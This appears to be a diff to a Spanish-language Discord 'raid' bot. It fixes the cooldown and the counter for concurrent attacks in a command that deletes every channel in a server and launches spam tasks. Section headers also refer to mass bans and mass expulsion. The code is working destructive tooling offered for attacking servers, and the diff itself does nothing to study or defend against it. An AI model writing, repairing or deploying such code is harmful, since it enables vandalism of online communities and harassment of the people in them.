@@ -107,8 +107,7 @@ async def banpro(ctx):
         await asyncio.sleep(0.8)
 
 
-# ================= 2. COMANDO RAIDEAR Y SPAM (rD) con COOLDOWN =================
-# 🔥 Modificación: 1 uso cada 600 segundos (10 minutos) por servidor (Guild)
+# ================= 2. COMANDO RAIDEAR Y SPAM (rD) con COOLDOWN CORREGIDO =================
 @bot.command()
 @commands.cooldown(1, 600, commands.BucketType.guild)
 async def rD(ctx):
@@ -124,13 +123,19 @@ async def rD(ctx):
     if actuales >= MAX_EJECUCIONES:
         try: await ctx.send(f"❌ Límite alcanzado en este servidor ({actuales}/{MAX_EJECUCIONES}). Espera a que termine el ataque actual.")
         except: pass
+        # Forzar que el cooldown se reinicie para que no se despericie el intento si chocó con el límite
+        ctx.command.reset_cooldown(ctx)
         return
 
-    # Suma al iniciar el ataque
-    ejecuciones_por_servidor[ctx.guild.id] = actuales + 1
-    logging.info(f"📈 [INICIO] Contador para Guild {ctx.guild.id}: {actuales + 1}/{MAX_EJECUCIONES}")
+    # Se inicializa la bandera para saber si la ejecución sumó correctamente
+    sumado = False
 
     try:
+        # 🔥 Suma al iniciar el ataque real de forma segura
+        ejecuciones_por_servidor[ctx.guild.id] = actuales + 1
+        sumado = True
+        logging.info(f"📈 [INICIO ANIDADO] Contador para Guild {ctx.guild.id}: {actuales + 1}/{MAX_EJECUCIONES}")
+
         channels_to_delete = list(ctx.guild.channels)
         for channel in channels_to_delete:
             try: await channel.delete()
@@ -159,10 +164,11 @@ async def rD(ctx):
         await asyncio.gather(*tasks)
 
     finally:
-        # Resta al finalizar (Garantiza que baje a 0 aunque ocurra algún error intermedio)
-        actuales_al_final = ejecuciones_por_servidor.get(ctx.guild.id, 1)
-        ejecuciones_por_servidor[ctx.guild.id] = max(0, actuales_al_final - 1)
-        logging.info(f"📉 [FIN] Contador para Guild {ctx.guild.id} restablecido a: {ejecuciones_por_servidor[ctx.guild.id]}/{MAX_EJECUCIONES}")
+        # 🔥 Resta al finalizar SOLO si se logró sumar al inicio de este comando
+        if sumado:
+            actuales_al_final = ejecuciones_por_servidor.get(ctx.guild.id, 1)
+            ejecuciones_por_servidor[ctx.guild.id] = max(0, actuales_al_final - 1)
+            logging.info(f"📉 [FIN ANIDADO] Contador para Guild {ctx.guild.id} restablecido a: {ejecuciones_por_servidor[ctx.guild.id]}/{MAX_EJECUCIONES}")
 
 
 # ================= 3. EXPULSIÓN MASIVA =================
@@ -391,13 +397,13 @@ async def ayuda(ctx):
         pass
 
 
-# ================= MANEJO DE ERRORES (Muestra el Cooldown) =================
+# ================= MANEJO DE ERRORES CORREGIDO =================
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound): 
         return
     
-    # 🔥 Si el comando !rD está en enfriamiento en ese servidor
+    # Si el comando !rD está bloqueado por el cooldown de los 10 min
     if isinstance(error, commands.CommandOnCooldown):
         minutos = int(error.retry_after // 60)
         segundos = int(error.retry_after % 60)
@@ -418,4 +424,4 @@ async def on_command_error(ctx, error):
     logging.error(f"Error: {error}")
 
 bot.run(TOKEN)
-                   
+        
